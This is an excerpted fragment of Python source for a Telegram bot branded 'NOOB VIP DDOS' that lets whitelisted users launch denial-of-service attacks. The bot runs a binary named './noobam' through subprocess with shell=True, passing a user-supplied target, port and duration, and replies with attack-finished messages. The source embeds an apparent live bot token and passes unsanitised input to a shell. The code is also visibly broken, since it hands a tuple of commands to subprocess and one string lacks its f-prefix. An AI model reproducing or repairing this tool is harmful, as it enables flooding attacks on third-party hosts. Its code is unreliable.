...
bot = telebot.TeleBot('7405828235:AAGrp5aL_ltdOZgASTKdwyq5YBOIXi2fjVk')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @ITS_LUCI"
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./noobam {target} {port} {time} 110", "./noobam {target} {port} {time} 10"
                process = subprocess.run(full_command, shell=True)
                response = f"❌⚠️ ΔŦŦΔĆҜ 2 ₣ƗŇƗŞĦ€Đ ⚠️❌\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹NOOB VIP DDOS🌹"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "⚠️2 𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀⚠️\n\n/noob <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nₑₓ. ₋ ₂₅₇.₆₄.₅₅.₇ ₁₂₃₄₅ ₂₄₀\n𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘿𝙀𝙉𝘼 👍\n\n★[NOOB VIP ɢʀᴘ 🚩]★"  # Updated command syntax
    else:
        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @ITS_LUCI")
...
def show_command_logs(message):
    ...
    if user_id in allowed_user_ids:
        ...
        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @ITS_LUCI"
